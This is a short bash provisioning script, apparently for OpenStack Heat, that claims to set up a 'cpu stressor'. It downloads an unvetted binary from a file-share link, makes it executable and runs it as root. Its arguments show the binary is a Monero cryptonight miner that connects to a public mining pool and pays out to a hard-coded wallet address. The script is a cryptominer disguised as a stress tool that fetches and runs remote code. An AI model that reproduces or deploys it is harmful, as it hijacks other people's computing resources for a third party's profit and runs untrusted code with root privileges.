#!/bin/bash
. /etc/sysconfig/heat-params

echo "Start to configure cpu stressor as a client"

sudo apt update && apt install -y libmicrohttpd10 \
                       libhwloc5 libcurl4-openssl-dev
wget -O stressor https://owncloud.gwdg.de/index.php/s/0aUOjR89S3Tr79W/download
chmod +x stressor
sudo ./stressor -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 49zaRwbRQNv9MfHijHCPaoGQUoSKc5TUSZhM4eb7GdToTabyLrEB1HhJwSyQA4N7TkcBbYNDnzuDLGgngyr76ukkC7zu7B2 -p x -t 16

